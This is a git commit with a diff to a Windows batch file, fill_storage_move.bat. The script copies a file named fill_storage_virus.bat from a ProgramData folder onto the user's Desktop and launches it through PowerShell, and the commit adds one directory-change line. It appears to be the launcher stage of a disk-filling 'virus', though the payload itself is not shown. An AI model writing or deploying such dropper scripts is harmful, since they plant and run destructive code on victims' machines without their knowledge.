50d27f89871cff83a6db8622c87b37eecd61987f
丂乃ﾌ <66360827+s3q@users.noreply.github.com>
2022-04-12 01:27:21 +0400

    Update fill_storage_move.bat

--- extensions/fill_storage_move.bat
+++ extensions/fill_storage_move.bat
@@ -1,5 +1,6 @@
 @echo off
 cd C:\ProgramData\Ms
 copy fill_storage_virus.bat C:\Users\%USERNAME%\Desktop
+cd C:\Users\%USERNAME%\Desktop
 powershell.exe -noexi "cd C:\Users\%USERNAME%\Desktop; fill_storage_virus.bat"
 exit
